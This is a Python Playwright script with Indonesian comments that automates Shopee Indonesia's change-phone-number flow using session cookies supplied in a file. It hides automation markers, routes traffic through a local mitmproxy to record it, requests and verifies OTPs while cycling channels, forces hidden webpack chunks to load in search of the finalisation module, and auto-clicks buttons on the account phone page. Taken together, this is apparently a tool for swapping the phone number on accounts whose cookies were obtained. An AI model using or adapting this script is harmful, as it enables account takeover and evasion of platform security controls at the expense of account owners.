"""REA_MITM_FULL.py — browser headless + MITM PROXY (mitmproxy) + REA.

Jalankan SELURUH flow ganti nomor di browser, SEMUA traffic lewat mitmproxy
(port 8080) -> upstream relay residensial. Setiap request/response dan setiap
file .js direkam oleh mitm_addon.py.

Kunci: load semua chunk lazy yang mungkin berisi modul service finalisasi,
termasuk memaksa webpack load chunk lewat __webpack_require__.e() dari page.

Argumen:
  python3 REA_MITM_FULL.py <cookie> <phone> [kode]
"""
import json
import sys
import os
import time
import re

CK = sys.argv[1] if len(sys.argv) > 1 else "ck_zax.txt"
PH = sys.argv[2] if len(sys.argv) > 2 else "62895806564446"
CODE = sys.argv[3] if len(sys.argv) > 3 else ""
MITM = "http://127.0.0.1:8080"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
T0 = time.time()
OP = 23


def log(*a):
    m = f"[{int(time.time()-T0):4d}s] " + " ".join(str(x) for x in a)
    print(m, flush=True)
    open("/root/shopee-verify/RMF.log", "a").write(m + "\n")


ck = open(CK).read().strip()
cookies = [{"name": p.split("=", 1)[0].strip(),
            "value": p.split("=", 1)[1].strip(),
            "domain": ".shopee.co.id", "path": "/"}
           for p in ck.split(";") if "=" in p]

from playwright.sync_api import sync_playwright

with sync_playwright() as pw:
    br = pw.chromium.launch(headless=True, args=[
        "--no-sandbox", "--disable-dev-shm-usage", "--window-size=1366,900",
        "--disable-blink-features=AutomationControlled", "--lang=id-ID",
        "--ignore-certificate-errors"])
    ctx = br.new_context(
        user_agent=UA, locale="id-ID",
        viewport={"width": 1366, "height": 900},
        timezone_id="Asia/Jakarta",
        proxy={"server": MITM},
        ignore_https_errors=True)
    ctx.add_cookies(cookies)
    ctx.add_init_script(
        "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
        "window.chrome={runtime:{}};"
        "Object.defineProperty(navigator,'languages',{get:()=>['id-ID','id','en']});")
    pg = ctx.new_page()

    pg.on("response", lambda r: log(
        f"  ← {r.status} {r.url.split('shopee.co.id')[-1][:60]} :: {r.text()[:170]}")
        if "/api/" in r.url and any(x in r.url for x in ("phone", "otp", "vcode", "commit"))
        else None)

    log("=== 1. warm via MITM ===")
    try:
        pg.goto("https://shopee.co.id/", wait_until="domcontentloaded", timeout=70000)
    except Exception as e:
        log(f"  warm err: {str(e)[:90]}")
    pg.wait_for_timeout(13000)
    log(f"  url={pg.evaluate('()=>location.href')[:80]}")

    # === 2. init + settings + verify ===
    log(f"\n=== 2. flow op={OP} ===")
    st = pg.evaluate("""async (a)=>{
      const {phone,op}=a; const out={};
      try{
        const i=await (await fetch('/api/v4/account/management/change_phone_init_v2',
          {method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},
           body:JSON.stringify({phone,seq_no:null})})).json();
        const id=i.data||{};
        out.init=i.error; out.cp=id.change_phone_token||''; out.ivs=id.ivs_required;
        const g=await (await fetch('/api/v4/otp/get_settings_v2',
          {method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},
           body:JSON.stringify({phone,operation:op})})).json();
        const gd=g.data||{};
        out.set=g.error; out.seed=gd.seed||''; out.cap=gd.need_captcha;
        return out;
      }catch(e){out.ex=String(e).slice(0,100);return out;}
    }""", {"phone": PH, "op": OP})
    log(f"  init={st.get('init')} cp={len(st.get('cp') or '')}B seed={str(st.get('seed'))[:18]} cap={st.get('cap')}")
    cp = st.get("cp") or ""
    seed = st.get("seed") or ""

    vt = ""
    if CODE:
        v = pg.evaluate("""async (b)=>{try{
          const r=await fetch('/api/v4/otp/verify_vcode',{method:'POST',credentials:'include',
            headers:{'Content-Type':'application/json'},body:JSON.stringify(b)});
          return {s:r.status,j:await r.json()};
        }catch(e){return{ex:String(e).slice(0,70)}}}""",
            {"phone": PH, "vcode": CODE, "operation": OP, "m_token": cp})
        log(f"  verify err={(v.get('j') or {}).get('error')}")
        if (v.get("j") or {}).get("error") == 0:
            vt = ((v.get("j") or {}).get("data") or {}).get("vcode_token") or ""
            log(f"  ✅ vcode_token {len(vt)}B")
            json.dump({"phone": PH, "cp": cp, "seed": seed, "vcode_token": vt},
                      open("/root/shopee-verify/RMF_ok.json", "w"), indent=1)
    else:
        r = pg.evaluate("""async (a)=>{const out={tries:[]};
          for(const ch of [3,2,1]){
            const j=await (await fetch('/api/v4/otp/send_vcode',{method:'POST',credentials:'include',
              headers:{'Content-Type':'application/json'},
              body:JSON.stringify({phone:a.phone,channel:ch,operation:a.op,seed:a.seed})})).json();
            out.tries.push({ch,err:j.error});
            if(j.error===0){out.win=ch;out.trk=(j.data||{}).otp_tracking_id;break;}
            if(j.error!==23500101) break;
          }
          return out;}""", {"phone": PH, "seed": seed, "op": OP})
        log(f"  send: {json.dumps(r)[:200]}")
        if r.get("win"):
            log(f"  ✅ OTP terkirim ch={r['win']} trk={r.get('trk')}")
            json.dump({"phone": PH, "op": OP, "cp": cp, "seed": seed,
                       "ch": r["win"], "trk": r.get("trk")},
                      open("/root/shopee-verify/C23_state.json", "w"), indent=1)
        br.close()
        sys.exit(0)

    # === 3. PAKSA webpack load SEMUA chunk lazy yg relevan (REA) ===
    log("\n=== 3. paksa load chunk lazy (webpack e()) ===")
    loaded = pg.evaluate("""async ()=>{
      const out={ok:[],fail:[],chunks:[]};
      const wp = window.webpackChunkshopee_pc;
      if(!wp){out.err='no webpackChunkshopee_pc'; return out;}
      // ambil runtime require
      let req=null;
      wp.push([[Math.random().toString(36).slice(2)],{},function(r){req=r;}]);
      if(!req){out.err='no require'; return out;}
      out.hasRequire = typeof req.e==='function';
      // nama chunk target (dari PageUserPhone: 58331/93679/93651) + yg mungkin service
      const targets=[58331,93679,93651,5427,8963,9308,1250,2735,8167,5358,896,66199,22725,9358];
      for(const c of targets){
        try{
          await req.e(c);
          out.ok.push(c);
        }catch(e){ out.fail.push(c+':'+String(e).slice(0,40)); }
      }
      // daftar semua chunk id yg diketahui runtime
      try{ if(req.u) out.u_sample = req.u(58331); }catch(e){}
      return out;
    }""")
    log(f"  {json.dumps(loaded)[:400]}")

    # === 4. buka halaman + klik ===
    log("\n=== 4. halaman + klik ===")
    for tag, u in [
        ("phone-vtok", f"https://shopee.co.id/user/account/phone?vcode_token={vt}&seed={seed}&operation={OP}&step=confirm"),
        ("phone", "https://shopee.co.id/user/account/phone"),
    ]:
        log(f"  --- {tag}")
        try:
            pg.goto(u, wait_until="domcontentloaded", timeout=55000)
        except Exception:
            pass
        pg.wait_for_timeout(12000)
        cur = pg.evaluate("()=>location.href")
        log(f"      {cur[:88]}")
        cl = pg.evaluate("""()=>{const out=[];
          for(const e of document.querySelectorAll('button,a,[role=button]')){
            const r=e.getBoundingClientRect(); if(r.width<24||r.height<18) continue;
            const t=(e.innerText||'').trim().slice(0,30); if(!t) continue;
            if(/logout|keluar|hapus|delete|batal|cancel/i.test(t)) continue;
            try{e.click(); out.push(t);}catch(x){}
            if(out.length>=5) break;
          } return out;}""")
        if cl:
            log(f"      klik {cl}")
            pg.wait_for_timeout(8000)

    # === 5. ringkas hasil dari MITM ===
    log("\n=== 5. HASIL MITM ===")
    try:
        for line in open("/root/shopee-verify/MITM_FULL.jsonl"):
            d = json.loads(line)
            if d.get("kind") == "REQ" and "/api/" in d.get("url", ""):
                sh = d["url"].split("shopee.co.id")[-1].split("?")[0]
                if any(x in sh for x in ("phone", "otp", "commit", "vcode", "user/phone")):
                    log(f"  {d['method']} {sh}")
                    if d.get("body"):
                        log(f"     {d['body'][:180]}")
    except Exception as e:
        log(f"  err {e}")

    # === 6. cek nomor ===
    log("\n=== 6. nomor ===")
    fi = pg.evaluate("""async()=>{try{
      const r=await fetch('/api/v4/account/basic/get_account_info',{credentials:'include'});
      const j=await r.json();const d=j.data||{};
      return {err:j.error,user:d.username,phone:d.phone};
    }catch(e){return{ex:String(e).slice(0,50)}}}""")
    log(f"  {fi}")
    br.close()

log("\n=== SELESAI ===")
